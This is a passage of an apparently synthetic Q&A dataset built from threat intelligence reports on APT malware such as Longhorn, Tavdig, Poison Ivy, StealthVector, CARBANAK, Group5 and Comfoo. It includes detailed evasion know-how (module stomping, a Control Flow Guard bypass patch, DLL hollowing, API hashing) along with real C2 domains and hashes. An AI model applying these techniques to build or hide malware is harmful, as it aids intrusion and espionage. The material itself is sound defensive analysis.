tools did they investigate? Additionally, how did the researchers approach the analysis of these RATs, and what were some of the key findings related to their protocols and communication methods?",
    "output": "The researchers chose to focus on analyzing Remote Administration Tools (RATs) due to their interest in low-level analysis and the recent media attention on RATs being used by oppressive governments for spying on activists and dissidents. The specific features and functionalities of RATs they investigated included keylogging, screen and camera capture, file management, code and script execution, power control, registry management, and password sniffing. The researchers analyzed several publicly available RATs: DarkComet, Bandook, CyberGate, and Xtreme RAT. All of these RATs were coded either in part or entirely in Delphi and featured a reverse connecting architecture, as well as some form of cryptography or obfuscation of their communications. The researchers presented their analysis of the protocols used by these RATs, explained how to decrypt their traffic, and identified vulnerabilities in these tools. The appendices of the report contained Man-in-the-Middle (MITM) tools for decrypting traffic and proof of concept exploits for the discovered vulnerabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: Who is Longhorn?\nLonghorn has been active since at least 2011. It has used a range of back door Trojans in addition to zero-day vulnerabilities to compromise its targets. Longhorn has infiltrated governments and internationally operating organizations, in addition to targets in the financial, telecoms, energy, aerospace, information technology, education, and natural resources sectors. All of the organizations targeted would be of interest to a nation-state attacker.\nLonghorn has infected 40 targets in at least 16 countries across the Middle East, Europe, Asia, and Africa. On one occasion a computer in the United States was compromised but, following infection, an uninstaller was launched within hours, which may indicate this victim was infected unintentionally.\n#Vault7 linked #Longhorn group infiltrated governments, international orgs, other targets\nBig Headline: The link to Vault 7\nA number of documents disclosed by WikiLeaks outline specifications and requirements for malware tools. One document is a development timeline for a piece of malware called Fluxwire, containing a changelog of dates for when new features were incorporated. These\ndates align closely with the development of one Longhorn tool () tracked by Symantec. New features in Corentry consistently appeared in samples obtained by Symantec either on the same date listed in the Vault 7 document or several days later, leaving little doubt that Corentry is the malware described in the leaked document.\nEarly versions of Corentry seen by Symantec contained a reference to the file path for the Fluxwire program database (PDB) file. The Vault 7 document lists removal of the full path for the PDB as one of the changes implemented in Version 3.5.0.\nUp until 2014, versions of Corentry were compiled using GCC. According to the Vault 7 document, Fluxwire switched to a MSVC compiler for version 3.3.0 on February 25, 2015. This was reflected in samples of Corentry, where a version compiled on February 25, 2015 had used MSVC as a compiler.\nA second Vault 7 document details Fire and Forget, a specification for user-mode injection of a payload by a tool called Archangel. The specification of the payload and the interface used to load it was closely matched in another Longhorn tool called .\nA third document outlines cryptographic protocols that malware tools should follow. These include the use of inner cryptography within SSL to prevent man-in-the-middle (MITM) attacks,\nkey exchange once per connection, and use of AES with a 32-byte key. These requirements align with the cryptographic practices observed by Symantec in all of the Longhorn tools.\nOther Vault 7 documents outline tradecraft practices to be used, such as use of the Real-time Transport Protocol (RTP) as a means of command and control (C&C) communications, employing wipe-on-use as standard practice, in-memory string de-obfuscation, using a unique deployment-time key for string obfuscation, and the use of secure erase protocols involving renaming and overwriting. Symantec has observed Longhorn tools following all of these practices. While other malware families are known to use some of these practices, the fact that so many of them are followed by Longhorn makes it noteworthy.\nBig Headline: Global reach: Longhorn's operations\nWhile active since at least 2011, with some evidence of activity dating back as far as 2007, (<http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-4148>)Longhorn first came to Symantec's attention in 2014 with the use of a zero-day exploit () embedded in a Word document to infect a target with Plexor.\nThe malware had all the hallmarks of a sophisticated cyberespionage group. Aside from access to zero-day exploits, the group had preconfigured Plexor with elements that indicated prior knowledge of the target environment.\nTo date, Symantec has found evidence of Longhorn activities against 40 targets spread across 16 different countries. Symantec has seen Longhorn use four different malware tools against its targets: Corentry, Plexor, , and .\nBefore deploying malware to a target, the Longhorn group will preconfigure it with what appears to be target-specific code words and distinct C&C domains and IP addresses for communications back to the attackers. Longhorn tools have embedded capitalized code words, internally referenced as \"groupid\" and \"siteid\", which may be used to identify campaigns and victims. Over 40 of these identifiers have been observed, and typically follow the theme of movies, characters, food, or music. One example was a nod to the band The Police, with the code words REDLIGHT and ROXANNE used.\nLonghorn's malware has an extensive list of commands for remote control of the infected computer. Most of the malware can also be customized with additional plugins and modules, some of which have been observed by Symantec.\nLonghorn's malware appears to be specifically built for espionage-type operations, with detailed system fingerprinting, discovery, and exfiltration capabilities. The malware uses a high degree of operational security, communicating externally at only select times, with upload limits on exfiltrated data, and randomization of communication intervals\u2014all attempts to stay under the radar during intrusions.\nFor C&C servers, Longhorn typically configures a specific domain and IP address combination per target. The domains appear to be registered by the attackers; however they use privacy services to hide their real identity. The IP addresses are typically owned by legitimate\ncompanies offering virtual private server (VPS) or webhosting services. The malware communicates with C&C servers over HTTPS using a custom underlying cryptographic protocol to protect communications from identification.\nPrior to the Vault 7 leak, Symantec's assessment of Longhorn was that it was a well-resourced organization which was involved in intelligence gathering operations. This assessment was based on its global range of targets and access to a range of comprehensively developed malware and zero-day exploits. The group appeared to work a standard Monday to Friday working week, based on timestamps and domain name registration dates, behavior which is consistent with state-sponsored groups.\nSymantec's analysis uncovered a number of indicators that Longhorn was from an English-speaking, North American country. The acronym MTWRFSU (Monday Tuesday Wednesday ThuRsday Friday Saturday SUnday) was used to configure which day of the week malware would communicate with the attackers. This acronym is common in academic calendars in North America. Some of the code words found in the malware, such as SCOOBYSNACK, would be most familiar in North America. In addition to this, the compilation times of tools with reliable timestamps indicate a time zone in the Americas.\nBig Headline: Distinctive fingerprints\nLonghorn has used advanced malware tools and zero-day vulnerabilities to infiltrate a string of targets worldwide. Taken in combination, the tools, techniques, and procedures employed by Longhorn are distinctive and unique to this group, leaving little doubt about its link to Vault 7.\nThroughout its investigation of Longhorn, Symantec's priority has been protection of its customers. Through identifying different strains of Longhorn malware, connecting them to a single actor, and learning more about the group's tactics and procedures, Symantec has been able to better defend customer organizations against this and similar threats. In publishing this new information, Symantec's goal remains unchanged: to reassure customers that it is aware of this threat and actively working to protect them from it.\n\nHow did the development timeline and technical specifications outlined in the Vault 7 documents align with the tools used by Longhorn?",
    "output": "The development timeline and technical specifications in the Vault 7 documents closely matched the tools used by Longhorn. For instance, the changelog dates for a piece of malware called Fluxwire aligned with the development of a Longhorn tool named Corentry. New features in Corentry consistently appeared in samples obtained by Symantec either on the same date listed in the Vault 7 document or several days later. Additionally, early versions of Corentry contained a reference to the file path for the Fluxwire program database (PDB) file, which was removed in Version 3.5.0 according to the Vault 7 document. Furthermore, up until 2014, versions of Corentry were compiled using GCC, but switched to an MSVC compiler for version 3.3.0 on February 25, 2015, matching the Vault 7 document.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "The main advantage of this approach is that the bit width of factor is never larger than 1025 (1024+1), while in the standard implementation, the factor can grow up to 2048 bits. In the traditional approach, the multiplication would have to be done in a 2048 bit target, and this value would have to be taken modulus the prime number afterwards -this time in a far more complex way, one subtraction would not suffice. By not shifting the values to be added to the left every time, but instead shifting the result to the right (inside the finite field), the modulus action is implicitly performed at every step implicitly. This is a quite elegant approach, but it requires the multiplication function to be aware of the finite field. So this function is not just a big int function, but a field-aware big-int multiplication function.\nThe downside is that, after all 1024 bits are processed, factor was divided by two 1024 times, so the result is too \"small\" (which mathematically is the wrong term inside the field, but we use it as an analogy): instead of ab, the value ab/(2\u02c61024) is returned.\nTo fix this problem, Tavdig uses a particular code to calculate a corrector value:\nThe corrector is initialized to 1 (not shown in the above screenshot), and is then multiplied with two 2048 times (twice the value of 1024). So, the final result is 2\u02c62048. Because we're operating in a field, this value can be normalized to the modulus. Now, after each multiplication, another multiplication with this corrector is required to fix the fact that the original multiplication returned a \"too small\" value. Because this second correction multiplication itself uses the same multiplication function returning \"too small\" values, the corrector needs to fix for both multiplications errors. This is why the corrector fixed for 2048 and not only 1024 right shifts.\nThis can be seen in the code to calculate a exponentiation algorithm (base\u02c6power) inside the field:\nHere we see that every multiplication is immediately followed by a second multiplication with the corrector. The exponentiation algorithm is rather straightforward: every bit in the power value is scanned, at each step base is multiplied to itself, and whenever a 1 bit is hit, base is multiplied to the result value, which is initialized with 1. This is the standard binary exponentiation algorithm.\nNow all required big number operations are available. They are used in a final decryption code like this:\nAfter the corrector is calculated, the variable minusOneMinusPK is initialized with the modulus (equivalent to 0), the XOR with 1 corresponds with subtracting one (the modulus is a prime and always odd), resulting in the value -1 of the field. The private key x is subtracted, and -as the comment depicts -coeff base \u02c6(-1-x) is calculated. This is basically the (<https://en.wikipedia.org/wiki/ElGamal_encryption#Decryption>)ElGamal decryption. Side note: the weird name minusOneMinusPK was chosen during the reversing process and should help the reverser to remember the variable contains \"-1 minus private key\" -finding good names for not yet completely known objects is one of the challenges of reverse engineering, and this sometimes fails or ends in weird names\u2026\nThe encrypted data blob is not sent as-is, but base-64 encoded and put into a server response that looks like this:\nSo, the base-64 encoded payload is placed between <div> and </div> and some text placed around. The trojan ignores the stuff around and only scans for <div> and </div>. Interestingly, above text is followed by many newlines. We assume this is done to flush the output if the payload is too small.\n\nIn the context of the RUAG cyber espionage case, how does the custom multiplication function used by Tavdig differ from the standard implementation, and what advantages does it offer? Additionally, explain the role of the 'corrector' value in this multiplication process.",
    "output": "The custom multiplication function used by Tavdig differs from the standard implementation in that it performs the modulus operation implicitly at every step by shifting the result to the right within the finite field. This approach ensures that the bit width of the factor never exceeds 1025 bits, whereas in the standard implementation, the factor can grow up to 2048 bits, requiring a more complex modulus operation afterward. The advantage of this method is its efficiency, as it avoids the need for a separate modulus operation after multiplication. However, this method results in a 'too small' value after processing all 1024 bits, specifically ab/(2^1024) instead of ab. To correct this, Tavdig uses a 'corrector' value, which is initialized to 1 and then multiplied by 2 a total of 2048 times. This corrector value is used to normalize the result to the modulus. After each multiplication, another multiplication with this corrector is performed to fix the 'too small' value. The corrector accounts for both the original multiplication error and the error introduced by the correction multiplication itself, hence it fixes for 2048 right shifts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Conclusion\nWe cannot say with certainty why the actors responsible for the admin@338, menuPass, and th3bug campaigns rely on Poison Ivy. But possible explanations include PIVY's easy-to-use features and the relative anonymity that an off-the-shelf RAT provides for attackers.\nCompared to other RATs, PIVY is very easy to operate. Its graphical user interface (GUI) makes building new servers and controlling infected targets simple. Attackers can point and click their way through a compromised network and exfiltrate data.\nCommodity RATs also complicate efforts by security professionals to correlate a threat actor's activity over time\u2014attackers can hide in the sea of malicious activity that also uses Poison Ivy-based malware.\nBy exposing the role of PIVY and other commodity RATs in APT campaigns we hope to complicate attackers' ability to hide behind these off-the-shelf tools\u2014and perhaps force them away from using these RATs.\nIn this report, we have provided several techniques that network defenders can use to not only identify a PIVY infection, but also classify and correlate detected infections to previously observed APT activity.\nIn the process of building their PIVY servers, attackers leave a number of potentially useful clues, such as:\n\u2022 The domains and IPs used for CnC\n\u2022 The chosen PIVY process mutex\n\u2022 The chosen PIVY password\n\u2022 Launcher code used in the droppers\n\u2022 Timeline of activity\n\u2022 Targets of attack\nTogether, all of these data points can help effectively identify and correlate APT activity that uses the Poison Ivy RAT.\nBig Headline: About FireEye\nFireEye has invented a purpose-built, virtual machine-based security platform that provides real-time threat protection to enterprises and governments worldwide against the next generation of cyber attacks. These highly sophisticated cyber attacks easily circumvent traditional signature-based defenses, such as next-generation firewalls, IPS, anti-virus, and gateways. The FireEye platform provides real-time, dynamic threat protection without the use of signatures to protect an organization across the primary threat vectors, including Web, email, and files and across the different stages of an attack life cycle.\nThe core of the FireEye platform is a virtual execution engine, complemented by dynamic threat intelligence, to identify and block cyber attacks in real time. FireEye has over 1,000 customers across more than 40 countries, including over one-third of the Fortune 100.\nFireEye, Inc.  |  1440 McCarthy Blvd. Milpitas, CA 95035  |  408.321.6300  |  877.FIREEYE (347.3393)  |  (<mailto:info%40FireEye.com>)info@fireeye.com  |  (<http://www.fireeye.com>)www.fireeye.com\n\nWhy might attackers behind the admin@338, menuPass, and th3bug campaigns prefer using Poison Ivy (PIVY) over other remote access tools? What advantages does PIVY offer in terms of usability and anonymity?",
    "output": "Attackers might prefer using Poison Ivy (PIVY) due to its ease of use and the relative anonymity it provides. PIVY's graphical user interface (GUI) makes it simple to build new servers and control infected targets, allowing attackers to navigate through compromised networks and exfiltrate data with minimal effort. Additionally, the widespread use of commodity RATs like PIVY complicates the efforts of security professionals to correlate a threat actor's activity over time, as attackers can blend into the larger pool of malicious activity that also employs PIVY-based malware.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: StealthVector\nIn October 2020, we discovered StealthVector, an evasive shellcode loader written in C/C++. This malware implements various evasion techniques and is still actively being developed. We have observed that its payload is either the Cobalt Strike beacon or the malware ScrambleCross. (The Japanese security service company LAC previously published a blog post discussing the Cobalt Strike beacon.12)\nStealthVector is designed to execute the second stage of the payload in stealth mode. This means that its evasive techniques can be enabled and disabled by its embedded configuration. Because of this, malicious actors can easily customize this loader for their targets. The configuration of StealthVector (Figure 19) is embedded in its data section with ChaCha20 encryption, which is decrypted upon initialization (Figure 20). This ChaCha20 routine notably uses a fixed custom value of 0x13 for the initial counter (Figure 21).\nAccording to RFC7539, the Internet Engineering Task Force (IETF) specification for the ChaCha20 stream cipher and the Poly1305 authenticator,13 the ChaCha20 algorithm uses a 32-bit initial counter. This counter can be any number but is usually 0 or 1. As far as we have observed, StealthVector always uses 0x13 for its initial counter, which is an uncommon practice. This makes it difficult to decrypt the malware's configuration using common methods such as the Python library pycryptodome, which does not support custom initial counters.\nThe decrypted configuration data is copied onto a newly allocated buffer, which determines its behavior. There are two types of configurations found in the wild. One is for a local shellcode runner, which has a size of 0x38. This type of configuration has fields for checksum, flags for context awareness, flags for evasive features, and information for the payload (Figure 22 and Figure 23).\nThe other is for a remote shellcode injector, which has a size of 0x44. This type of configuration has fields for checksum, flags for context awareness, flags for evasive features, information for injection, and information for the payload (Figure 24 and Figure 25).\nVery Small Headline: Logic to Determine Payload Location\nStealthVector decrypts and executes its payload in memory, but it can also be configured to load its encrypted payload in a specific location. Some variants embed the payload in its binary, while others load it to another file in the same directory, whose file name is specified in the malware's configuration (Figure 28). The decryption logic is the same for all variants of StealthVector: It reads the specific size of data from a specific offset. The values for the offset and the size of the encrypted payload are already defined in the malware's configuration. Afterward, the payload will be decrypted by ChaCha20. This same routine is used in decrypting StealthVector's configuration, but the nonce for its payload is already defined in the configuration (Figure 29).\nVery Small Headline: Module Stomping in Local Process\nSome variants of StealthVector implement an evasive technique called module stomping, which is designed to bypass the detection of reflective loading. Module stomping is well known because Cobalt Strike has implemented this feature in its version 3.11.14 In the case of StealthVector, however, the injected payload is a shellcode instead of a dynamic link library (DLL). To perform this technique, StealthVector looks for a legitimate DLL that has sufficient space for its payload, \"(payload_size + 2048)\", as shown in Figure 32.\nOnce it finds one that meets its space requirement, StealthVector loads that DLL using the LoadLibraryExW function, with the flag DONT_RESOLVE_DLL_REFERENCES. As shown in Figure 33, when this flag is enabled, the system does not call the DllMain of the target DLL upon loading.\nOnce it loads the target DLL, StealthVector changes the protection settings of the DLL using read, write, and execute (RWX) permissions. It then copies its payload onto the legitimate DLL and executes the payload through the CreateThread function, as illustrated in Figure 34.\nVery Small Headline: Bypassing Control Flow Guard\nAs shown in Figure 35, some variants of StealthVector run their shellcode by bypassing Microsoft's Control Flow Guard (CFG), an exploit mitigation technology. CFG makes it difficult for malware to run code on Windows operating systems by restricting indirect calls to an unapproved address. In this case, StealthVector executes its shellcode using CreateThread, which checks the target address.\nIn order to sidestep attempts to verify its indirect call, StealthVector will then patch the LdrpHandleInvalidUserCallTarget API in ntdll.dll with \"48 FF E0 CC 90 (jmp rax; int3; nop)\",  as shown in Figure 36. LdrpHandleInvalidUserCallTarget is called when CFG, through the LdrpValidateUserCallTarget function, determines that the target address is invalid. StealthVector can patch this API without crashing the application.\nVery Small Headline: Phantom DLL Hollowing in Remote Process\nSome variants of StealthVector can also inject their shellcode payload into a remote process using phantom DLL hollowing, a technique that is a combination of process hollowing and module stomping (Figure 37). To do this, StealthVector spawns a new process, which is specified in its configuration, in suspended mode. StealthVector uses the NtCreateSection and ZwMapViewOfSection APIs to load a legitimate DLL into this newly created process. The logic of finding its target DLL is the same as that in module stomping: It checks if the code section, or (.text section size), is large enough. Afterward, it overwrites the code section of the loaded DLL with its own payload and executes it in the DLL's memory space. It then patches the entry point of the legitimate process in order to modify the shellcode's execution flow to this entry point in the DLL. Using this method, malicious actors can hide StealthVector's payload within the memory space of an image, which often goes unnoticed by common memory scan engines, and execute it like a normal module.\nMedium Headline: Cobalt Strike Beacon\nAmong most of the samples we have come across, there are two types of Cobalt Strike beacons: a hybrid HTTP DNS (Domain Name System) and HTTPS. Interestingly, all the Cobalt Strike beacons in memory are in a Portable Executable (PE) file format with a characteristic header, as shown in Figure 38. While it appears as a valid MZ header, it can also be executed as machine code.\nThis assembly, much like a PE header, calculates the address of a specific function, which serves as the entry point for the reflective loader to dynamically initialize and execute a DLL. It should also be noted that some of the samples have PE files with broken headers, although they still operate in the same way (Figure 39).\nThe Cobalt Strike beacons in the samples we have uncovered bear similarities to those used in attacks carried out by the Chimera APT group, as reported by Cycraft.15 However, it remains uncertain whether this campaign can definitively be linked to Chimera, as many similar Cobalt Strike beacons and Meterpreter shellcodes can also be found on VirusTotal (Figure 40).\nThe Cobalt Strike beacon found in the StealthMutant and StealthVector samples has two types of watermarks. One is \"305419896\", which is that of a cracked version, and is widely used by a variety of other malicious actors, according to research conducted by VMware Carbon Black.16 The other watermark is \"426352781\", which has been in use since at least May 2021 but has never been attributed to malicious actors before.\n\nBased on the above text, answer a question. How does StealthVector, the shellcode loader associated with Earth Baku, achieve stealth mode execution, and what are the implications of its evasive techniques?",
    "output": "StealthVector achieves stealth mode execution by implementing various evasion techniques that can be enabled or disabled via its embedded configuration. This allows malicious actors to customize the loader for specific targets. The configuration is embedded in the data section with ChaCha20 encryption, which is decrypted upon initialization. The use of an uncommon initial counter value (0x13) for the ChaCha20 algorithm makes it difficult to decrypt the malware's configuration using common methods. This level of customization and obfuscation makes StealthVector highly evasive and challenging to detect using standard security measures.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Mike's Perspective\nHaving source code sounds like cheat-mode for malware analysis. Indeed, source code contains much information that is lost through the compilation and linking process. Even so, CARBANAK's tasking component (for handling commands sent by the C2 server) serves as a counter-example. Depending on the C2 protocol used and the command being processed, control flow may take divergent paths through different functions only to converge again\nlater and accomplish the same command. Analysis required bouncing around between almost 20 functions in 5 files, often backtracking to recover information about function pointers and parameters that were passed in from as many as 18 layers back. Analysis also entailed resolving matters of C++ class inheritance, scope ambiguity, overloaded functions, and control flow termination upon named pipe usage. The overall effect was that this was difficult to analyze, even in source code.\nI only embarked on this top-to-bottom journey once, to search for any surprises. The effort gave me an appreciation for the baroque machinery the authors constructed either for the sake of obfuscation or flexibility. I felt like this was done at least in part to obscure relationships and hinder timely analysis.\nBig Headline: Anti-Analysis Mechanisms in Source Code\nCARBANAK's executable code is filled with logic that pushes hexadecimal numbers to the same function, followed by an indirect call against the returned value. This is easily recognizable as obfuscated function import resolution, wherein CARBANAK uses a simple string hash known as PJW (named after its author, P.J. Weinberger) to locate Windows API functions without disclosing their names. A Python implementation of the PJW hash is shown in Figure 11 for reference.\nThis is used several hundred times in CARBANAK samples and impedes understanding of the malware's functionality. Fortunately, reversers can use the to annotate the obfuscated imports, as shown in Figure 12.\nThe CARBANAK authors achieved this obfuscated import resolution throughout their backdoor with relative ease using C preprocessor macros and a pre-compilation source code scanning step to calculate function hashes. Figure 13 shows the definition of the relevant API macro and associated machinery.\nThe API macro allows the author to type API(SHLWAPI, PathFindFileNameA)(\u2026) and have it replaced with GetApiAddrFunc(SHLWAPI, hashPathFindFileNameA)(\u2026). SHLWAPI is a symbolic macro defined to be the constant 3, and hashPathFindFileNameA is the string hash value 0xE3685D1 as observed in the disassembly. But how was the hash defined?\nThe CARBANAK source code has a utility (unimaginatively named tool) that scans source code for invocations of the API macro to build a header file defining string hashes for all the Windows API function names encountered in the entire codebase. Figure 14 shows the source code for this utility along with its output file, api_funcs_hash.h.\nWhen I reverse engineer obfuscated malware, I can't help but try to theorize about how authors implement their obfuscations. The CARBANAK source code gives another data point into how malware authors wield the powerful C preprocessor along with custom code scanning and code generation tools to obfuscate without imposing an undue burden on developers. This might provide future perspective in terms of what to expect from malware authors in the future and may help identify units of potential code reuse in future projects as well as rate their significance. It would be trivial to apply this to new projects, but with the source code being on VirusTotal, this level of code sharing may not represent shared authorship. Also, the source code is accessibly instructive in why malware would push an integer as well as a hash to resolve functions: because the integer is an index into an array of module handles that are opened in advance and associated with these pre-defined integers.\n\nQ: What insights can be gained from analyzing the CARBANAK source code regarding the use of the C preprocessor and custom code scanning tools for obfuscation? How might this knowledge help in anticipating future malware development techniques and identifying code reuse?",
    "output": "A: Analyzing the CARBANAK source code provides valuable insights into how malware authors leverage the C preprocessor and custom code scanning tools to implement obfuscation without imposing an undue burden on developers. The authors use C preprocessor macros to replace function calls with hashed equivalents, and a custom utility scans the source code to generate a header file with string hashes for all Windows API function names. This approach not only obfuscates the malware's behavior but also simplifies the development process. Understanding these techniques can help cybersecurity experts anticipate similar methods in future malware projects. By recognizing patterns of code reuse, analysts can identify potential shared authorship or common development practices among different malware families. However, with the source code being publicly available on VirusTotal, the extent to which this represents shared authorship is uncertain. Nonetheless, the source code offers a clear explanation of why malware pushes both an integer and a hash to resolve functions: the integer serves as an index into an array of module handles that are opened in advance and associated with pre-defined integers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Malware Seeding on the Website (Dropper Doc 3)\nWhile monitoring the website, we identified several directories that auto-download a further malicious file (assadcrimes.info.ppsx). These links seem designed for other forms of social engineering, perhaps using similar bait to the messages targeting Al-Ameer. The Assadcrimes.info.ppsx file concerns the Syrian conflict, with characters and cartoons culled from social media and online sites.\nTranslation:\nA new Play in Syria\nRussian-American plan to divide the Syrian cake.\nWhen viewed, the victim's computer is silently infected with malware (See (<https://citizenlab.org/2016/08/group5-syria/#part3>)Part 3: Windows Malware).\nAssadcrimes.info.ppsx\nMD5: 30BB678DB3AD0140FC33ACD9803385C3\nMedium Headline: Martyred Children (Decoy Dropper 4)\nElsewhere on the site we found several HTML pages that, when visited, triggered the downloading of a malicious executable named \"martyred children\" (alshohadaa alatfal.exe). When executed, the program pulls images hosted on assadcrimes[.]info of the (<https://en.wikipedia.org/wiki/Ghouta_chemical_attack>)Ghouta Chemical Attacks, while simultaneously infecting the target machine with malware.\nMalware from the website is described in Part 3: Windows Malware\nalshohadaa alatfal.exe\nMD5: 2FC276E1C06C3C78C6D7B66A141213BE\nMedium Headline: Malicious PowerPoint\nmalware using two different techniques: (1) executing OLE objects using animation actions within a PowerPoint slideshow and; (2) using CVE-2014-4114 to drop and execute malicious code.\nIn assadcrimes.ppsx the operators embed an OLE Package object within a PowerPoint slideshow. When displayed as an animation, the object is executed while the slideshow is viewed, a (<http://phishme.com/powerpoint-and-custom-actions/>)technique that has been previously described (for more\ndetail, see (<https://citizenlab.org/2016/08/group5-syria/#appendix-a>)Appendix A: Dropper Doc 1 & (<https://citizenlab.org/2016/08/group5-syria/#appendix-a>)Appendix A: Dropper Doc 3). In this case the user is presented with a prompt asking whether they wish to run the object.\nIn the assadcrimes1.ppsx, the operator has created a PowerPoint file that leverages CVE-2014-4114, a vulnerability in the OLE packager component of the Windows operating system (See (<https://citizenlab.org/2016/08/group5-syria/#appendix-a>)Appendix A: Dropper Doc 2).\nDecoy Applications\nThe operators have also created a decoy application, hosted on assadcrimes[.]info, that displays images of child victims of the 2013 Ghouta Chemical Attacks. When executed, the application silently decrypts and drops the malware (See\nMedium Headline: The RATs\nThe operators use these techniques to deliver two commonly available Remote Access Trojans (RATs): njRat and NanoCore RAT. In both cases, Group5 disguised the malicious binaries with several layers of obfuscation, including crypting and packing to reduce the possibility of detection by antivirus software.\nBoth RATs provide a wide range of functionality on the target machine, ranging from collecting files, watching the screen, to capturing passwords and keystrokes. The RATs also enable the operator to remotely delete files, and spy on the computer user via the microphone or webcam.\nBig Headline: Part 4: The Android Malware\nWhile examining assadcrimes[.]info, we determined that the site was also hosting a decoy Flash Player update page. This page, located on a subdomain, included a download link to a malicious Android APK. For a full analysis of this malware see (<https://citizenlab.org/2016/08/group5-syria/#appendix-b>)Appendix B: Android Malware .\nWhile examining the website we found that the operators had prepared Android malware masquerading as an Adobe Flash Player update notification. Clicking on the \"Update\" link (See Figure 8) downloads a malicious file, masquerading as a software update.\nThe APK is an instance of DroidJack. According to (<http://www.symantec.com/connect/blogs/droidjack-rat-tale-how-budding-entrepreneurism-can-turn-cybercrime>)Symantec, this malware evolved from an older codebase known as SandroRAT. The RAT provides a wide range of functionality, enabling the operator to capture messages, contacts, photos and other materials from the device. In addition, DroidJack can also remotely activate the phone camera and microphone, without notifying the victim. Figure 9 shows some of the functionality available.\nA more extensive analysis of the DroidJack malware, can be found in (<https://citizenlab.org/2016/08/group5-syria/#appendix-b>)Appendix B: Android Malware . Interestingly, DroidJack has also emerged recently, (<https://www.proofpoint.com/us/threat-insight/post/droidjack-uses-side-load-backdoored-pokemon-go-android-app>)bundled with versions of Pok\u00e9mon Go.\nThis approach to mobile malware seeding, while cumbersome, might be assumed to have greater success in the target group of Syrians than other populations. It is common for Syrians to share Android APK files outside the Google Play Store, as Google Play Services are not available within Syria. This practice carries over to the Syrian diaspora in other countries, despite the availability of Google Play. As a result, we suspect that most devices are set to accept APK files from unknown developers.\n\nQuestion: What types of Remote Access Trojans (RATs) are used by Group5, and how are they disguised to evade detection by antivirus software?\n\nAnswer:",
    "output": "Group5 employs two commonly available Remote Access Trojans (RATs): njRat and NanoCore RAT. To avoid detection by antivirus software, the operators disguise the malicious binaries with multiple layers of obfuscation, including crypting and packing. These RATs offer extensive functionality, such as collecting files, capturing screenshots, stealing passwords and keystrokes, and spying on users via the microphone or webcam.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: sHA1: 5191d7e28ffd1bc76ec7ed02d861679a77f2c239\nAn examination of the static properties of the file reveals that the file is a 64-bit Dynamic Link Library for the Microsoft Windows operating system. The file's PE headers provide also the following interesting information:\n1. The creation time of the file is 19:37:07, 25.11.2011 according to the PE header's TimeDateStamp field.\n2. The linker version is set to 9.00. This is consistent with Visual Studio 2008 Orcas, initially released in 2007. Despite not being the latest version of Microsoft's development tools available at the moment of the (suspected) compilation of the DLL, Visual Studio 2008 is able to generate x64 binaries. This might hint at the fact that this binary was produced using an existing development framework as part of an existing operation.\n3. The binary appears to be digitally signed by Microsoft. The digital signature will be further considered in section 4, but it is at this point interesting to note that the validity range of the certificate does encompass the binary creation date as specified in the PE header. Keeping in mind that the adversary has done a tremendous effort in camouflaging this binary, it is reasonable to assume that the binary was indeed produced at the time specified by the PE header.\n4. The DLL exports 16 functions, which are simply forwarders for functions exported by wshtcpip.dll, a standard component of Microsoft Windows. These exports will be considered again in section 4.\nThe analysis of the sample's strings, in combination with the symbols specifically imported from other modules, hint at the fact that the sample we have analyzed might interact at a low level with physical drives of the machine it is running on. For example, the string PRIVHEAD is a strong indicator that the sample might have some knowledge of Microsoft Windows' Logical Disk Manager (LDM); in fact, such PRIVHEAD is the expected magic value for LDM's PRIVATE_HEADER structures. Proper malware analysis presented in section 4 will confirm these suspicions.\nFinally, the string '\\\\.\\<WINDOWS>' is particularly interesting. The format of the string, specifically the 'WINDOWS' substring between angular brackets, is an indication of a strong connection between this sample and 32-bit samples of stage #1 of the complex threat named Regin; in fact, samples of Regin's 32-bit stage #1 used a similar format to mark strings that needed expansion.\nRead the text above and answer this question: How does the use of Visual Studio 2008 in the creation of the Regin malware DLL provide insights into the attacker's methodology and resources?",
    "output": "The use of Visual Studio 2008, which was not the latest version available at the time of the DLL's suspected compilation, suggests that the attacker may have been utilizing an existing development framework as part of an ongoing operation. This could indicate that the attacker had access to older but still functional tools and was potentially leveraging established infrastructure rather than developing new tools from scratch. Additionally, Visual Studio 2008's ability to generate x64 binaries aligns with the DLL's characteristics, reinforcing the idea that the attacker had specific needs and capabilities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: coMfoo\nComfoo malware have been seen in conjunction with campaigns targeting sensitive entities in both Japan and India. We found a version of the Comfoo malware on the duojee.info server as well as an email attack that used the same version of Comfoo malware. In fact, the .DOC file used in the attack dropped an .EXE file with the same MD5 hash as the one found on the duojee.info server.\nTable 6: Sparksrv malware samples and C&C locations\nWhile at least two of the Comfoo variants are essentially the same, the traffic encryption methods used in the Comfoo sample found in connection with duojee.info differed from other Comfoo variants we've analyzed that are not directly related to the Luckycat campaign. The more common Comfoo malware samples we analyzed used custom encryption methods while the variant found on the duojee.info server utilized the Windows Cryptographic Application Programming Interface (API). This Comfoo variant's initial network communication sent the following information to the C&C server:\n\u2022 Randomly generated characters\n\u2022 MAC address\n\u2022 IP address\n\u2022 OS version\n\u2022 String, \"liberate,\" as campaign code\nThe attackers gather the following information from infected systems:\n\u2022 CPU, NETBIOS, and disk information\n\u2022 System, OS version, and account information\n\u2022 Network adapters, protocols, and configuration information\n\u2022 Installed applications as well as Internet Explorer (IE) and Browser Helper Object (BHO) information\nThe malware the attackers use is capable of receiving several commands.\nThis Comfoo email attack leverages the current situation in Tibet to encourage recipients to open a malicious attachment that exploits a vulnerability in Microsoft Office\u2014CVE-2010-3333, in order to drop a malware onto the target's system.\nAfter the decoy document opens, the Comfoo malware begins to communicate with johnnees.rkntils.10dig.net, which resolves to the IP address, 69.162.71.254\u2014the same host that some Sparksrv malware samples we analyzed use.\nThe samples in Table 9 connect to havefuns.rkntils.10dig.net or johnnees.rkntils.10dig.net, which both resolve to the same IP address\u201469.162.71.254.\nBig Headline: 